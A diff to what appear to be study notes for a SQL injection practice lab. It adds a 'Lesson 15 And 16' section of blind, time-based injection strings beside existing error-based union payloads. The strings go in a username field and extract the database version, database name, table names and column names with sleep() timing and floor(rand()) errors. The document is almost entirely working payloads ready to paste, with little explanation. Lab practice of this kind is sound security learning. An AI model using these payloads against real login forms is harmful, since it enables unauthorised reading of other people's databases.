@@ -112,8 +112,25 @@ username: ') union select count(*),concat((select database()),floor(rand()*2))a 
 
 username: ') union select count(*), concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a;
 
+```
+
+###  Lesson 15 And 16
+
+```
+# Blind-boolian/time-based SQLi (Use '>','<', and "=" to construct boolian condition.)
+
+1' or if ((select substr((select version()),1,1))=5,sleep(2),null)#
+username:1' or if((select ascii(substr((select database()),1,1)))=ascii('s'), sleep(2), null);#
+username: 1' or if((select ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)))=ascii('e'),sleep(2),null)#
+
+username: ' or if((select ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))=ascii('i')),sleep(2),null);#
 
 
+```
+
+
+
+```
 
 
 ```
